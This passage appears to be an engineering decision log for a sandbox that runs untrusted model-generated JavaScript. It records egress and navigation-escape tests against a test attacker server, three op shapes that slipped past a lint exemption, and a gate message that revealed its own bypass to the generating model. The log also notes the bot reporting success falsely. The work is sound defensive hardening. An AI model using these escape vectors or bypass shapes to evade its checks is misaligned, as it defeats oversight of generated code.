- **D166: the mechanism classifier is now known wrong in BOTH directions, and
  the second direction was found by the same run that found the first.**
  D164 recorded it calling a minimal behaviour-changing EDIT a regeneration,
  because word survival drops whenever a request requires deletion. The
  template loop supplies the opposite error: the rsvp venue change and the
  countdown date change went out correctly as HOST EVENTS with a byte-identical
  bundle and no revision bump, and `measure.py` reported both as **NO-OP** —
  because it only diffs bundles, and a host event changes the board without
  changing a byte of code.

  So the instrument mislabels in both directions, for the same underlying
  reason: **it infers a mechanism from bundle text, when a revision legitimately
  happens through two different mechanisms and a correct edit may delete as much
  as it adds.** A replacement has to read the mechanism from what was POSTED —
  spec revision, migration snapshot, host event — and use text survival only to
  characterise a republish once it knows it is looking at one.

  Recorded rather than built. It is the first thing to fix before any further
  format measurement, because every number D130 rests on came from this
  instrument.

### `--preserve-state` refuses a revision it cannot carry

- **D167: publish now refuses a preserving revision whose `initialState`
  changed, because a merge that is SAFE cannot fix the bug and a merge that
  fixes it is not safe.**

  D165 found `--preserve-state` silently discarding a revision's new state. The
  drop is two lines: `reducer.ts:268` sets
  `state = snapshot ? snapshot.state : spec.initialState` — the snapshot
  REPLACES `initialState`, never merges with it — and the migration gate above
  it means a preserving spec **never reads `spec.initialState` on any reachable
  path**. Publish's `foldForMigration` then carries the state folded under the
  OLD definition forward verbatim.

  **Why the obvious fix is not a fix.** The only merge rule that is safe on
  arbitrary member data is _seed keys the live state lacks, never touch a key it
  has_. Under that rule the confirmed case is **not repaired**: `/itemOrder`
  exists on both sides, so the array stays four elements and the new row still
  never renders. The rules that would repair it are all unsafe — **replace**
  discards every reordering and append a member made, **concatenate** duplicates
  every carried element, **union** invents an order the author never wrote. So
  the choice was never merge-versus-refuse; it was refuse, or ship the
  elaborate approximation this project has a rule against.

  **The comparison axis is the design.** The diff is old `initialState` against
  new `initialState`, **never** new `initialState` against live state. Live
  state diverges from any declared start the moment a member acts — that is what
  preserving is FOR — so comparing against it would refuse every preserving
  revision. Two declared starting states differ only where an author edited one,
  so the diff is exactly this revision's intent. Arrays are compared whole as
  leaves, because array elements have no cross-revision identity; the refusal
  can say `/itemOrder` differs and not which element, and that is the honest
  limit rather than a guess. Removed keys are reported, never deleted. A retype
  refuses without picking a winner, because picking one is the guess being
  refused.

  Cleared by `--allow-initial-state-change` (the D99 waiver pattern this file
  already uses three times), which prints the two-step remedy. A refusal with no
  remedy would be circular: the compensating host event must be tagged with the
  new revision, so the publish has to happen first.

  **The finding that justifies a mechanism at all, and it is the strongest part.**
  Design (c) — document it — was ALREADY SHIPPED and it failed.
  `SKILL.md:205-215` and `PARADIGM.md:679-690` describe this exact bug in the
  imperative, with the two-step remedy, the fourth-poll-choice example, the
  failure named — _"Publish the revision alone and you will tell the user it was
  added while they look at the old three"_ — and an instruction to confirm with
  `surface state` **before** saying it landed. The bot had both documents, did
  the forbidden thing, and reported success. Documentation of the precise
  failure, in the skill the model reads, is not a sufficient control. That is
  empirical, from this session's own loop, and it is the general lesson: where a
  doctrine sentence and a refusal are both available, the sentence has now been
  measured and found insufficient.

  Controls in all three directions: the negative built from the real shape
  (`itemOrder` gains an element AND `items` gains a key — both halves asserted);
  a genuinely separate positive on a board whose live state had already drifted
  with `initialState` untouched, which must still publish; and a regression
  control that waives, publishes, posts the compensating host event, and checks
  the boundary sits below the event so nothing double-applies.

  Three mutations, each applied by an anchored replace that **asserts exactly
  one occurrence** so a formatter-shifted anchor aborts rather than silently
  no-opping — the failure mode that bit this session earlier. Neutering the
  guard kills 2 and the positive control SURVIVES, as it must. Making the leaf
  comparison blind kills 3, including the array case — the blind spot a safe
  merge would have had. Comparing against `{}` (refuse-everything) kills 16,
  which is what proves the positive control is not vacuous.

  Suite 1302 pass / 13 skip / 4 fail against a 1291 baseline; the 4 are the
  known local `media-guard` TLS failures.

  **Not fixed, deliberately:** the same drop exists on both repair paths
  (`surface-records.ts:975` and publish's stranded retry), left alone because
  they run on channels already migration-pending and refusing would strand an
  unusable board further. And **the waiver is a two-step the tool still cannot
  verify** — nothing checks the host event was ever posted. The structurally
  complete fix is a `--migrate-ops` input applied in the same command, making it
  atomic; that is a feature with its own validation surface and is the first
  candidate for next session.

### What the bot's adaptation drops, and two checks that catch the mechanical half

- **D168: the bot narrows faithfully and breaks invariants that exist only as
  comments — so the catches had to be mechanical, and the obvious mechanical
  rule was unshippable.**

  Nine live boards compared against the templates they came from. **Five of nine
  are clean narrowings**: things left out because the recipe never asked for
  them (workout's weights and progression, leaderboard's streaks, countdown's
  run-up checklist), and every addition wired end to end — no orphan actions
  anywhere. The bot is good at this.

  What it degrades is narrower and more interesting: **structural invariants
  stated only in template comments**, and **copy it rewrites**.
  - `kanban` drops the `here` exclusion, so every card draws a button for the
    column it is already in — twelve dead controls.
  - `countdown` hardcodes `"October 15, 2026"` into a card while
    `state.targetLabel` says `"Thursday, October 22, 2026"` — two dates for one
    launch on one screen, against a template whose whole doctrine is derive,
    never hardcode.
  - `potluck` drops the template's undecided grouping, so a member with no
    course vanishes from the crew list while still counting in the headline.
  - `"1 people active"` came from the bot REWRITING a phrase the template had
    written plural-safe.

  **The obvious no-op rule is unshippable, and that was measured before
  anything was built.** A bare self-loop test (`edge.from === edge.to`) fires on
  **eight of the nine shipped templates** — re-pressing `vote-pizza` legitimately
  changes nothing. The discriminator this file first proposed — "flag it when
  the same action changes state elsewhere" — **does not separate them**:
  `loopOnlyActions` is 0 on every app, so every idempotent template action also
  moves state somewhere, exactly like the kanban button.

  The discriminator that works is **whose data the write belongs to**, and it is
  not a heuristic — it is the pattern `PARADIGM.md` already documents as the
  default. An edge `S --A--> S` in a CLOSED walk is a defect **unless EVERY op
  of `A` mentions `$actor`**, in a path segment or in a value. `every`, not
  `some`: the kanban action is
  `[set /tasks/cover-art/status "doing", set /claims/$actor "cover-art"]`, and
  an any-op test exempts it on the second op while the first is the dead half.
  Both `$actor` spellings are load-bearing — path (`/votes/$actor`) and value
  (`set /paidBy/ferry "$actor"`, expense-split) — and a path-only test would
  have flagged a shipped template. Result: **0 findings on all nine templates,
  0 on eight of nine live boards, 12 on the kanban.**

  **The copy check is narrow on purpose.** Number/noun agreement against a
  curated 25-word list, matched **per leaf text run**, never against whole-tree
  text. That reading is load-bearing in both directions and both are tested:
  whole-tree text glues `…shared board.` onto `1 people active` so the boundary
  rejects the real defect, and it also INVENTS matches by gluing `Week 1` to
  ` people are here` across sibling divs. It also respects a line the shell
  already draws — `Stat` paints value and label in separate spans, so
  "1 / votes so far" is never one run, and a stat label is a category name that
  stays plural.

  **Not fixed, and named:** `"split 1 ways"` is a real agreement defect in the
  `expense-split` TEMPLATE, not the bot's doing. Admitting `ways` means
  admitting idiomatic adverbials, which is the road to a general `1 \w+s`
  pattern that fires on "1 status" and still misses "1 people". It is
  executable-documented instead — a test passes `extraCountNouns: ['ways']` and
  asserts the template then fails. And **three defects no check here can reach**
  — countdown's contradicting dates, kanban's missing crew card, potluck's
  vanishing undecided members — all need the REQUEST or the app's intent, which
  the reachability pass explicitly does not have.

### The populated captures are synthetic, and now say so

- **D169: six of nine templates fold to a board no group could produce, the
  defect is representativeness rather than reachability, and the fix could not
  be the obvious one because of a binding this project added the day before.**

  `foldPopulatedState` invokes EVERY declared action, rotating three synthetic
  ships. So wherever two actions write the same slot, the last one declared
  wins it. Measured: `rsvp` headlines **"0 Coming"** with all three declining;
  `workout-tracker` has every member failing all five lifts; `kanban` puts all
  six cards in Done with three members claiming the same one; `potluck` puts all
  three on dessert and paints **`Dessert 4 of 3`**. Plausible: poll, leaderboard.
  Honestly vacuous: countdown.

  **A correction to how this was first framed here.** None of these states are
  unreachable — a member really can be the fourth on dessert, because the app
  declares no cap. The defect is **representativeness**, not reachability, which
  is precisely why the transition graph cannot fix it.

  **Why the obvious fix was impossible, not merely partial.** "Use the authored
  `state.json`" cannot reach the artifact the mechanism protects: `surface
publish` REFUSES a `--state` sheet by name (D157's `stateSha256` binding), so
  the sheet that gates publish is always fold-based. Yesterday's guard closed
  the door on today's preferred remedy — worth recording, because that is the
  cost of a binding and it was not foreseen when the binding was written.
  Constraining the fold was rejected too: the spec declares no capacities to
  stop at (`courses.mains.want` is app-authored state with no schema), and a
  fold that merely LOOKED plausible would be scored as real with no tell at all.

  So check 5's cell now carries a machine stamp, mirroring check 7's
  reachability citation: what was folded, by whom, and that no group produced
  it. **The line never judges the board** — judging needs a model of what a group
  would do, which nothing here has — so poll is not slandered and potluck is not
  excused.

  **The blast radius is wider than check 5.** The sheet lets check 7 name any of
  the twelve cells, so a reviewer can answer "is this what was asked for" from a
  synthetic capture and read "0 Coming" as a broken app. The doctrine now says
  to score check 7 from an `initial` capture; **no validator enforces it**,
  deliberately, because a populated capture can legitimately be the best place
  to judge prominence. Stated hole, not an oversight.

  **Evidence this failure mode is real and not theoretical: I fell into it.**
  Reading the populated cells, I reported to Patrick that three shipped
  templates were defective — over-capacity, self-contradictory, everything-done.
  All three were artifacts. I had read the caveat earlier the same day.

- **D170: two guards for the same hazard, one silent and one loud, in the same
  hour — and the loud one is the pattern.** Adding the `count-agreement` rule
  broke `surfaces-eval-probe.ts`, which refuses to score when the gate holds a
  rule it has not classified: _"REFUSING TO SCORE: the gate has rule(s) this
  probe does not classify."_ That is the correct shape, and its own comment says
  why — defaulting would file a behavioural rule under `lint` on a scoreboard
  whose entire purpose is to keep those apart. `count-agreement` is now filed
  beside `jargon`, because the split those lists make is fold-versus-not rather
  than rendered-versus-not.

  Contrast the tolerance list in the same file, which D162 recorded as
  hand-maintained: it went stale AGAIN in this session when check 5's citation
  was added. Same file, same hazard, two mechanisms — one fails loudly and got
  fixed in a minute, one fails silently and has now been forgotten twice in two
  days. **The lesson is not "maintain the list"; it is that a list which must
  grow with an artifact should refuse rather than default.**

## Session 6d — verification hardening

Every item this session repaired an instrument, a claim, or a record. Nothing
added capability. The organising fact is that the guards written before this
project adopted its own rules were never re-audited under them, and the audit
at the end of 6c found five that could not fail — including the one guard
standing between untrusted model-generated JavaScript and the network.

### The egress instrument

- **D171: the sandbox egress test could not fail, and now can — measured, not
  argued.** All five probes (fetch, XHR, WebSocket, image beacon, `sendBeacon`)
  targeted `https://beacon.invalid/`, an RFC-6761 name that can never resolve.
  Every "blocked" verdict was the branch a DNS failure takes, and the
  network-level backstop was satisfied by DNS failure too. The correct harness —
  a real attacker HTTP server, mandated by D43 as the standard for future leak
  tests and named in `navigation.spec.ts` by name as the anti-pattern
  `sandbox.spec.ts` embodied — was ~400 lines away in the same suite and had
  never been back-ported.

  Rebuilt on it. A blocked verdict is now **zero connections observed at a
  server that was listening and would have answered**; every probe posts
  `probe-armed` before firing, so a frame that never loaded cannot score as a
  frame whose probes were all blocked; and the CSP-removed arm is a peer test
  rather than a comment, so a probe that stops being able to reach the attacker
  at all fails loudly instead of passing quietly. The WebSocket probe needed an
  `upgrade` listener on the attacker: node routes a handshake there and not to
  the request handler, so a connected WebSocket would otherwise have left no
  trace — the same class of bug one level down.

  **The demonstration, because "the test is better now" is exactly the sort of
  claim this session exists to stop accepting.** Deleting the CSP meta from
  `buildSandboxDocument` makes the enforced arm fail with `fetch reached the
  attacker at /fetch — Expected: 0, Received: 1`. The `.invalid` version
  survived that mutation unchanged. 195 tests pass across chromium, firefox and
  webkit.

  **`sendBeacon` is now asserted at all.** Its old comment correctly disclaimed
  its return value as an egress signal — it reports queueing, not transmission —
  and then nothing asserted the transmission either. Against a listening
  attacker the transmission is observable, so it is.

- **D171.1: the `window.top` / `localStorage` confound was real, and the answer
  came from measuring it rather than reasoning about it.** Those two probes ran
  on an `about:blank` host, so the PARENT had an opaque origin of its own; their
  refusal could not be attributed to the sandbox's missing `allow-same-origin`.
  Measured directly: on `about:blank`, granting `allow-same-origin` leaves
  `localStorage` reporting `blocked` on all three engines. The flag makes no
  difference there, so the old verdict was unattributable — it was the parent's
  opacity doing the work.

  The suite now serves its host page from a real origin, where granting the flag
  DOES make both escapes succeed, and that arm ships as a control. This is the
  general shape worth keeping: a guard whose positive result has two possible
  causes has not measured either one.

- **D171.2: the Navigation API vector, deferred since D93, is measured.** D93
  recorded a bundle reaching the attacker origin through `window.navigation
  .navigate()` on chromium WHILE PASSING THE GATE, and deferred the probe as "a
  follow-up for that suite". Until now the matrix licensed "self-navigation is
  blocked" for five spellings rather than as a class, and D36 forbids citing
  "very likely blocked by `frame-src`" in place of a measurement.

  Now `nav-navigation-api`, across all eight host configurations and three
  engines. It reproduces D93 exactly — under `A/no-csp` on chromium it reaches
  the attacker and commits its document — and the shipped policy blocks it at
  preflight with zero hits, with the allowlist-the-attacker controls landing so
  the block is attributable to source matching.

  The API does not exist on firefox or webkit, and the probe **says so** rather
  than navigating: an absent API produces zero hits, and scoring that as
  `BLOCKED-PREFLIGHT` would credit the CSP with work it never did. That is the
  same substitution of a failure branch for a verdict that made the `.invalid`
  probes vacuous, so the classification `API-ABSENT` exists to make it
  unrepresentable.

- **D171.3: D43's redirect residual is CLOSED, and the answer is the good one.**
  D43 named "redirect chains from an allowlisted origin to an attacker origin"
  as known-untested and said it "must be measured before anyone calls the hole
  closed"; D44 carries it as flip criterion 2, outstanding since session 4.
  Every config in the matrix points the frame straight at the attacker, so none
  of them exercised the hop that any non-empty allowlist reintroduces.

  Measured with a third origin that 302s to the attacker: **all three engines
  re-check the redirect target against `frame-src`.** Zero attacker hits, no
  commit. The control — both origins allowlisted — lands, so the refusal is
  about the destination and not about the redirect being broken. Still untested
  from D43's list: `data:` / `blob:` navigation targets.

- **D171.4: the posture suite runs in CI, on all three engines, and gates
  merges.** It ran nowhere before, so per-PR protection against a sandbox
  regression was a CSP *string* pinned in a unit test — which a change to the
  iframe flags, the document assembly, or the host policy passes untouched. New
  `sandbox-posture` job, `SANDBOX_ENGINES: all`, gated `app == 'true'` (the
  filter that covers both `apps/tlon-web/**` and `packages/surface-shell/**`),
  and appended to `ci-ok`'s `needs` so it blocks rather than merely reports.
  All three engines because the vectors diverge by engine; a chromium-only run
  would license a claim the matrix makes about three.

- **D171.4 AMENDMENT: the posture job passed its first CI run by accident and
  failed its second, on a docs-only push.** The job cached
  `~/.cache/ms-playwright` and ran `playwright install --with-deps` only on a
  cache miss. Browser binaries live in the cache; the apt libraries webkit
  needs to launch do not — they go onto the ephemeral runner. So a cold cache
  installed them and 204/204 passed; the next push hit a warm cache, skipped
  the step, and every webkit case failed in 1–4 ms with `MiniBrowser: error
  while loading shared libraries: libwoff2dec.so.1.0.2`, taking `CI OK` down
  for a commit that added one markdown file. Chromium and firefox passed
  because the base image already carries their libraries.

  Fixed by splitting the step: `playwright install-deps` every run,
  `playwright install` only on a miss. **Demonstrated on the next run,
  `e9d03fa0e0`, under the conditions that failed:** cache hit, binaries step
  skipped, system-deps step ran, `204 passed (7.2m)`. Same runner class, same
  warm cache, one variable changed. Recorded because it is this session's
  own class of defect — a guard whose first green was a property of the
  environment it happened to run in, not of the thing it measures — landing
  on the job that was added to remove that class. The claim "the posture
  suite runs in CI" was true for exactly one run before this.

- **D171.5: four artifacts said `frame-src` ships disabled. It ships
  ENFORCING.** `ENFORCE_HOST_CSP` is `true`. The stale claim sat in
  `surface-lint.ts`'s rule-5 docstring, in D93, and TWICE in plan §5 — the
  prompt named three and the fourth was in the v0 security claim itself, the
  single sentence most likely to be quoted at someone. All four corrected, and
  §5 now states what the rebuilt suite actually demonstrates, with its probe
  list, rather than a summary of it.

  The honest residual is now stated where the claim is: `frame-src` is an
  **origin allowlist, not a prohibition**. The two shipped sources stay
  reachable, so the guarantee is origin-restricted navigation and never "no
  navigation".

### The two checks that shipped bypassable

- **D172: the `$actor` exemption fell to MOVING the token, not removing it, and
  the fix was one line.** The gate exempts an action from `no-op-control` when
  every op "writes `$actor`". Its predicate was a faithful transliteration of
  the reducer's `substituteActorInValue`, recursive descent included — and that
  fidelity was the bug. **Substitution is a property of where the AUTHOR PUT the
  token; ownership is a property of where the op WRITES**, and the gate never
  looked at the second. So three shapes that all write SHARED paths took the
  exemption:

      set /tasks/theme        {"status":"doing","claimedBy":"$actor"}
      set /tasks/theme/status {"v":"doing","by":"$actor"}
      set /config/mode        ["fixed","$actor"]

  All three passed `spec-schema`, `pointer-hygiene`, `action-idempotency` and
  every other rule. Narrowing the value arm to "the value IS exactly `\"$actor\"`"
  closes all three at zero cost: across all nine templates the token appears in
  a value four times, all in `expense-split`, all the bare string. The recursive
  arms had one synthetic test — which asserted the bypass — and no other user.

  Control: with the arms restored, the three shapes report `noOpControls: []`;
  with the narrowing, all three report. Both directions run.

- **D172.1: the finding text published its own bypass to the party that
  benefits.** The message ended _"an action whose every op writes `$actor` is
  exempt"_, and `surface preview` prints `finding.message` verbatim into the
  defect list the generating model reads and repairs against. Stripped. The rule
  stays documented for humans in `RUBRIC.md`; a model repairing a defect needs
  to know what is wrong, not which shape makes the check stop looking. A test
  now asserts the message contains neither "exempt" nor "$actor".

- **D172.2: nothing imported both readers of `$actor`, and now something
  does.** The gate's detector and the reducer's substituter were written days
  apart in different packages and held together only by sharing the placeholder
  STRING — not its semantics. That is the raw-vs-validated class (D72) with no
  test standing between the halves. The new differential test asserts the
  agreement that must hold (nothing the gate exempts is a token the reducer
  would ignore or refuse) AND pins the divergence that must NOT be closed (the
  gate is strictly narrower on values). A future edit "restoring parity" by
  widening the gate fails it — verified by making exactly that edit.

- **D173: an action the reducer refuses on every path shipped green, and now
  fails the gate.** An op with partial-segment `$actor` (`/votes/$actor-choice`)
  is a hard grammar refusal, so the action is declared, drawn, pressable, and
  incapable of ever moving the board. Every existing rule was structurally blind
  to it: `pointer-hygiene` sees a legal pointer; `action-idempotency` sees two
  identical states, **because a refused fold is trivially idempotent**; the
  activation shortfall sees a control that does invoke it; and `no-op-control`
  EXCLUDES it, because the walk skips aborted edges. A dead action was clean.

  New rule 18, `inert-action`. The signal was already in hand and simply never
  read — `reduceSurface` returns `abortedSequenceNums` and nothing in
  `surface-lint.ts` looked at it. Control: the fixture spec lints `ok: true`
  with the rule disabled and `ok: false` with it.

  Scoped to yield when an earlier rule already reported on the same action: a
  statically-malformed pointer also aborts every fold, and reporting both would
  tell a repairing model that one broken path is two defects. The rule exists
  for the refusal that passes every static check.

  It also tripped `surfaces-eval-probe.ts`, which refuses to score when the gate
  holds a rule it has not classified — the D170 mechanism working twice in three
  days, on the author who wrote the entry about it.

### Data consistency

- **D174: two posts sharing a sequence number made the fold order-dependent,
  and every determinism property excluded the case.** There is no unique index
  on `(channelId, sequenceNum)`; two posts sharing one tied completely in the
  comparator, so `Array.prototype.sort`'s stability handed the result to
  whichever order the posts arrived in. Two clients holding identical posts
  could hold different state — precisely what §6 promises cannot happen.

  The four order-invariance properties could not see it: all four shuffle a
  hand-built array whose sequence numbers come from a strictly-increasing
  counter. **The failing input was outside the generator of the property that
  was supposed to cover convergence.** Duplicates are now in it.

  Tie-break is the host-stamped post id, which the host assigns on the same
  event and increases in the same order. Compared numerically, not
  lexicographically: canonical ids are dot-grouped variable-length `@ud` renders
  (`170.141.184.505…`), so a plain string compare puts `9` after `10`. The field
  is optional — absent, the sort falls back to the previous behaviour — and the
  client adapter, which had been dropping `id`, now carries it.

- **D175: an inflated `upToSequenceNum` could brick a channel permanently, and
  the plan described the obligation as though it were a check.** A snapshot
  claiming `upTo: 1_000_000` wins selection forever (selection takes the
  greatest), freezes every real event beneath its boundary, and leaves the board
  at `foldedEventCount: 0` — recoverable only by deleting that specific post.
  The realistic trigger is not malice but a writer putting a millisecond
  timestamp in the field.

  Hydration already held the answer and never passed it: the server-advertised
  head (`channels.lastPostSequenceNum`). It is now threaded to the reducer,
  which skips any snapshot claiming coverage beyond it. **Skipping rather than
  clamping** — a boundary that wrong means the writer's state is untrustworthy
  too, so the honest move is to fold the real log.

  Deliberately still true without a head: a caller that supplies none gets the
  old behaviour, pinned by its own test. The reducer alone cannot tell an honest
  boundary from a fabricated one, so this is a ceiling, not a proof.

- **D176: `--preserve-state`'s semantic is a writer obligation, and is now
  recorded as one.** D167's guard lives only in `surface publish`; the reducer
  still replaces `initialState` wholesale, and every merge rule that would carry
  an edit is unsafe. So Hermes, a hand-edited channel description, and the
  client-executed publish v1 contemplates all reintroduce the bug at full
  strength. It was written down only in a test comment and D167 — nowhere in the
  plan.

  Now in plan §4.3 and §7 (with the snapshot-boundary obligation, as the two
  rules the reducer cannot enforce alone), and as a named out-of-scope case in
  the hooks design note: both are host-authored, and the pre-filter must allow
  every host event, so neither is reachable there. No new code beyond tests that
  pin replace-wholesale as the documented contract, so a future "helpful merge"
  has to delete an explicit test rather than quietly change a line.

### The render path

- **D177: a bundle that threw before `register` left a blank board forever, and
  wiring `onShellError` would not have fixed it.** The audit read this as an
  unplumbed callback. It is worse than that: on a module-evaluation throw the
  shell posts **only `ready`**. The shell's script has already completed, the
  bundle's separate script aborts, `register` is never reached, `app` stays
  null, and every render short-circuits — so the host sees a healthy handshake
  and an app that never draws. There was no error message to route. Passing the
  callback would have changed nothing.

  Two halves, therefore. The shell installs window `error`/`unhandledrejection`
  handlers that report `init` while `app` is still null (after registration the
  render path owns errors and reports them with the right phase). The host holds
  the report, renders `SurfaceHaltedState` — distinct from bundle-unavailable,
  because the bytes are fine and it is RUNNING them that failed — and offers a
  reload that bumps the session key rather than reassigning `srcdoc`, since
  reloading the same element is indistinguishable from the frame navigating
  itself, which the host tears down as hostile.

  Under the F6 rules the message may reach the card, which stays on device, and
  never telemetry, which carries only a host-derived enum and a counter.

  Control: a bundle with a ReferenceError on line one reports `init`; with the
  handlers removed, the report array is empty.

- **D178: the two halves of the render path were each tested against a fake of
  the other, and the composition had a live bug neither could see.** The React
  host suite mocks the shell artifact to `'void 0;'` and hand-dispatches the
  ready handshake, so no shell runs and no real message is parsed. The shell
  suite drives a hand-rolled iframe with no schema validation, no revision
  cross-check and no permission re-check, posting `init` with a fabricated
  one-action spec. Both were green while D177's bug was live — the host's stub
  shell never throws, and the shell's harness has no host state to leave blank.

  `composed.spec.ts` runs the real shell artifact, in a real browser iframe,
  driven by the real `createSandboxSession` with `ShellToHostMessageSchema`
  validation and the revision check active. The session is transport-agnostic by
  construction, so the only thing the test supplies is the wire. The halves'
  own tests stay; this is the composition, not a replacement.

  **A premise of mine was wrong and the test caught it.** I wrote a
  "stale-revision invoke is dropped" case on the belief that initializing the
  session at a different revision would make the shell's invokes stale. The
  session SENDS its spec in `init`, so the shell echoes back whatever revision
  the host gave it and the two cannot disagree while the frame is the one this
  session initialized. Rewritten to assert that premise compositionally, with
  the check itself exercised by a labelled synthetic message — rather than
  dressing a hand-made message up as shell behaviour.

  Also removed before it shipped: a "the frame really is blank" assertion using
  `contentDocument`, which is null across an opaque origin and would have read
  as "blank" whether or not it was. A guard that cannot fail, written into the
  file whose whole purpose is removing them.

### Record and hygiene

- **D179: the decision record's location is now checked mechanically, because
  three entries have gone to the wrong file and the third went on the day the
  check was written down.** `scripts/check-decisions-record.mjs` fails if any
  `DECISIONS.md` exists outside the repo root, and fails if any document on the
  branch cites a decision the tracked record does not define. It runs in
  `ci-config-check` — the one job with no path filter — for the same reason
  `check-ci-path-filters.mjs` does: a stray root markdown matches no filter, so
  a gated guard would be skipped exactly when it is needed.

  It caught this session's own forward references on its first run, before these
  entries existed. Prompts are excluded, since a handoff prompt legitimately
  names the number the next session will start at.

  **Stated rather than implied: there is no working pre-commit hook to attach
  this to.** `core.hooksPath` points outside the repository at a directory whose
  real hook file does not exist, so the installed shim exits 0. A pre-commit
  half would live outside git and could not be relied on; CI is the enforceable
  half.

- **D180: the NUL separators are gone, and the fix is an injective join rather
  than a prettier delimiter.** `surface-transitions.ts` and
  `dev/surfaces-score.mjs` used NUL and SOH as signature separators, which made
  `file(1)` call them `data` and made plain `grep` skip them **silently, with
  zero hits and no message** — three separate investigations lost time to it.

  The obvious fix is wrong. Those separators were collision-proof for a real
  reason: `canonicalJson` escapes every control character, so no token can
  contain one. Every printable candidate — `::`, `|`, a space, `␟` — CAN appear
  in a value, and a collision does not crash; it merges two distinct groups into
  one silently wrong reachability row. So the signatures are now
  `JSON.stringify([...])`: injective by construction, printable, and needing no
  argument about the token alphabet at all.

  Consequence recorded because it is not cosmetic: the scorer's digest changed,
  so `surfaces-eval-baseline.json`'s `corpus.sha256` was regenerated in the same
  commit. A stale one would have reported `corpusChanged: true` and read as
  "somebody edited the questions".

- **D181: plan §7 described the `$actor` key wrong, on six of nine templates.**
  It said path substitution emits the RFC-6901-escaped form (`~0zod`). The code
  substitutes into an already-unescaped segment list, so the real key is plain
  `~zod` — escaping is a property of the pointer's TEXT, never of the key the
  write lands on. The behaviour was right and the description was wrong, which
  is the dangerous direction: an implementer following the plan literally
  diverges.

  **The parity check the prompt asked for cannot be run from this repo.** There
  is no Python surface implementation here: `packages/hermes-tlon-adapter` has
  53 `.py` files and zero hits for `$actor`, `ACTOR_PLACEHOLDER`, `json_pointer`
  or `surface_spec` — every "surface" is the English word. The second
  implementation, if it exists, is out of tree. Recorded as an open question
  against the hermes repo rather than answered by inference.

- **D182: a host op can write a literal `$actor` object KEY, contradicting
  `jsonPointer.ts`'s own doc comment — noted, not fixed.** "Any `$actor` use
  invalidates the op" holds for path segments and string values, not for keys:
  `substituteActorInValue` walks `Object.keys` to recurse but assigns
  `out[key]` unchanged. Nothing re-scans stored state, so it stays literal
  forever. Left alone deliberately — substituting inside keys would make the
  write path depend on data shape in a way the pointer grammar does not, and
  refusing them would reject an app that legitimately wants that string as a
  key. The note exists so the sentence above is not read as a guarantee.

- **D183: housekeeping, each with its reason.** The truncated
  `surface-channels-f1-navigation-escape.md` stub (309 bytes, ending mid-word,
  untracked, no recoverable history) is deleted. The two seed fixtures that
  cannot pass the gate they predate — `surface-chart` (`undeclared-action` on a
  computed invoke) and `surface-revision` (`jargon` on the word "revision",
  which its purpose requires it to display) — are marked **ungated by design**
  in the seed doc, with the note that the right resolution is neither to rename
  the fixture nor to weaken the denylist. All 29 `data-testid` attributes are
  removed from the nine templates and `PRIMITIVES.md` now says not to write
  them: nothing reads one, so they are markup that looks load-bearing and is
  not.

  **The orphan `chat/~zod/dash-ltjbt690` is cleared** — after the session's
  report was written, once the CLI was rebuilt (the stale binary was the only
  reason it was declined). `tlon channels delete`, invoked inside the container
  with its env-driven loopback target and never the `--ship` flag; the ship's
  re-query answers `not found in any group`. A `create` that landed when its
  `publish` did not, now gone, with nothing else referencing it.

- **D184: `useSurfaceHydration` had no test, and under `staleTime: Infinity` its
  dependency predicate is the only thing that ever refreshes a board.** Nothing
  goes stale with time in this app; a query refetches only when an explicit
  invalidation matches it, and the match is `query.queryKey[1] instanceof Set &&
  setsOverlap(...)`. The position is a contract with `db/query.ts` that nothing
  type-checks — the hook uses raw `useQuery` rather than `createReadQuery`, so
  the Set is hand-placed. A key that put it anywhere else would silently never
  refresh again, forever, with no error.

  The key is now exported (`surfaceHydrationQueryKey`) so a test can assert the
  real one rather than a copy, and the tests drive the REAL invalidation path —
  a live `QueryObserver` on the module's own `queryClient`, with real writes —
  rather than re-implementing the predicate, which would have been the vacuity
  trap this session keeps finding. Positive cases: a post arriving, and D59's
  scenario end to end (a group re-sync landing a new bundle hash moves a mounted
  board on its own). Negative: an unrelated write leaves it alone.

  Control: moving the Set off index 1 fails THREE tests, not just the shape
  guard — the board keeps rendering its first fold forever, which is exactly the
  silent failure the position protects against.

  Two corrections to what I briefed, found by measurement: `insertChannelPosts`
  declares only `['posts']`, not `['posts','channels']`; and the four-table
  effect list I attributed to `insertGroups` is `updateGroup`'s. `insertGroups`'
  own effects do include `channels`, which is what makes the D59 case work, and
  `syncGroup` batches both in one ctx — so both routes to a re-sync land
  `channels` in the effect set.

- **D185: the four fixture states were finally LOOKED AT, and looking found
  three things reading the code could not.** Their backend behaviour and code
  paths had been verified; their rendered pixels never had. Screenshots are in
  `audit-notes/screens/`.

  Text matches the seed doc on all four (`surface-oversized`,
  `surface-invalid`, `surface-future`, `surface-migration`), the oversized
  Retry does re-fetch, and the invalid fixture's surface-event post correctly
  appears only in the sidebar preview and never in the main pane. Then:

  **The migration spinner is invisible. It rotates and paints nothing.** The
  element is present, sized, visible and demonstrably animating — and both of
  its circles compute to `stroke: none` and `fill: none`, so the region is
  blank white in the capture. `LoadingSpinner` passes
  `color={color ?? '$color.gray700'}`, and **`$color.gray700` is the only use
  of the `$color.` dotted namespace anywhere in `packages/ui/src` or
  `packages/app`** — every other component uses a bare theme key
  (`$secondaryText`, `$negativeActionText`). The token exists
  (`tamagui.config.ts:62`); that reference form does not resolve, so the stroke
  is never set.

  **This is the session's own thesis, arriving from outside.** A DOM or testID
  assertion sees a spinner. A `visibility`/`opacity` check sees a spinner. A
  user sees two lines of text and no motion. It is a guard-that-cannot-fail
  wearing UI clothes, and nothing short of looking at the pixels could have
  caught it.

  **Not fixed here, deliberately.** There are 33 `<LoadingSpinner />` call
  sites with no explicit colour across `packages/app`, `packages/ui` and
  `apps/tlon-mobile`, so the one-line fix is an app-wide visual change well
  outside a verification-hardening session, and I cannot confirm the corrected
  token renders without a browser pass over those screens. Recorded with its
  evidence so the next person starts from a diagnosis rather than a symptom.

  **The mechanism, established from source rather than from the browser** —
  which also rules out the environment hazard below as a cause, since this path
  never touches CSS extraction. `Spinner.mjs` does
  `if (color[0] === '$') color = variableToString(theme[color])`, so
  `'$color.gray700'` is looked up as a THEME key and misses. `variableToString`
  returns `` `${vrble || ''}` `` — an **empty string**, not `undefined`. React
  Native Web's `ActivityIndicator` defaults `color` to `#1976D2` only when the
  prop is `void 0`, so the empty string defeats its own fallback and reaches
  `<circle style={{stroke: ''}}>`, whose computed value is `none`. Tamagui
  converting a failed lookup to `''` is precisely what stops RNW's blue default
  from covering the mistake.

  **A finding I recorded and then had to withdraw, kept because withdrawing it
